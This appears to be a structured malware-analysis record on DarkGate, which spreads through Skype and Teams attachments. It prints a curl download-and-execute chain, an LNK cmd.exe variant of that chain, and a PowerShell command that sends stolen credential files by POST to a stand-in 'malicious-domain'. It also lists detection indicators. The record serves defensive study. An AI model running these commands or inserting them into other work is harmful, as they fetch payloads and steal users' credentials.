package_info.package_manager: N/A (delivered via messaging platforms, not a package manager)
package_info.why_malicious: DarkGate is a Windows-based malware distributed via social engineering on Teams and Skype, using malicious scripts and AutoIt to deliver remote access, credential theft, file encryption, and cryptocurrency mining capabilities. The entire package is malicious as it is designed to compromise endpoints, exfiltrate data, and enable further attacks.

execution_context.file_location: VBA script attached to Skype message (masquerading as PDF)

malicious_snippets.code_snippet: curl -o autoit.exe http://malicious-domain/autoit.exe && curl -o script.au3 http://malicious-domain/script.au3 && autoit.exe script.au3
malicious_snippets.code_behavior: Upon user execution, the script downloads a legitimate AutoIt binary and a malicious AutoIt script from a remote server, then executes the script, enabling further malware actions.

malice_analysis.why_suspicious: The script downloads and executes binaries from an external, untrusted source, a common malware delivery technique.
malice_analysis.violated_expectations: Normal VBA scripts should not download and execute external binaries, especially automation tools like AutoIt, without user consent or clear business purpose.
malice_analysis.similar_legitimate_use: Automated deployment scripts in IT environments may download and run trusted tools, but only from verified internal sources.
key_indicators: Use of curl to fetch executables from the internet
Chaining of download and execution commands

malicious_snippets.code_snippet: C:\Windows\System32\cmd.exe /c curl -o autoit.exe http://malicious-domain/autoit.exe && curl -o script.au3 http://malicious-domain/script.au3 && autoit.exe script.au3
malicious_snippets.code_language: shell (Windows command line, via LNK file)
malicious_snippets.code_behavior: When the user opens the LNK file, it triggers a command to download AutoIt and a malicious script, then executes the script, initiating the malware infection.

malice_analysis.why_suspicious: LNK files are commonly abused to execute hidden commands. Downloading and running executables from the internet is highly suspicious.
malice_analysis.violated_expectations: LNK files should point to legitimate applications or documents, not execute chains of commands that fetch and run remote code.
malice_analysis.similar_legitimate_use: IT deployment shortcuts may automate trusted tool installation, but not from untrusted sources.
key_indicators: LNK file with hidden command execution
Chained download and execution of remote files
Use of legitimate tool (AutoIt) for malicious purposes

execution_context.trigger: post-download (after AutoIt and script are fetched)

malicious_snippets.code_snippet:
; Pseudocode representation of malicious AutoIt script
Run('powershell -Command "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; $creds = Get-Content $env:APPDATA\Microsoft\Credentials\*; Invoke-WebRequest -Uri http://malicious-domain/exfil -Method POST -Body $creds"')
malicious_snippets.code_behavior: After being executed by AutoIt, the script runs a PowerShell command to collect credential files and exfiltrate them to a remote server via HTTP POST.

malice_analysis.why_suspicious: The script automates credential theft and exfiltration, using PowerShell to access sensitive files and send them to an attacker-controlled domain.
malice_analysis.violated_expectations: AutoIt scripts are typically used for automation, not credential theft or data exfiltration.
malice_analysis.similar_legitimate_use: Automation scripts may collect logs for IT support, but never exfiltrate credentials to external domains.
key_indicators: Use of PowerShell for credential access

attack_chain.action: Victim receives a malicious message (VBA script or LNK file) via Skype or Teams from a trusted or external sender.
attack_chain.leads_to: User executes the attachment, triggering the download of malware components.

attack_chain.action: Malicious script downloads legitimate AutoIt binary and a maliciously compiled AutoIt script from attacker-controlled infrastructure.
attack_chain.leads_to: Downloaded files are executed on the victim's machine.

attack_chain.action: AutoIt executes the malicious script, which performs credential theft, remote access, and data exfiltration.
attack_chain.leads_to: Attacker gains access to sensitive data and can perform further malicious actions (e.g., ransomware, crypto mining).

behavioral_signatures: Execution of curl or similar tools from VBA scripts or LNK files
Download and execution of AutoIt binaries from non-standard sources
AutoIt scripts invoking PowerShell for credential access and exfiltration
Unusual outbound HTTP POST requests following script execution
file_indicators: Unexpected .LNK files received via Teams or Skype
AutoIt.exe appearing in user temp or downloads directories
Unknown .au3 or compiled AutoIt scripts in user directories
network_indicators: Outbound HTTP/HTTPS requests to domains not associated with business operations (e.g., attacker-controlled infrastructure)
POST requests to suspicious endpoints immediately after script execution
detection_knowledge.how_to_detect: Monitor for execution of scripting tools (curl, PowerShell) from Office macros, LNK files, or AutoIt processes. Flag downloads and execution of AutoIt binaries from non-corporate sources. Detect AutoIt scripts that invoke PowerShell or access credential directories. Alert on outbound HTTP POST requests to unknown domains following script or AutoIt execution, especially if preceded by suspicious file downloads.
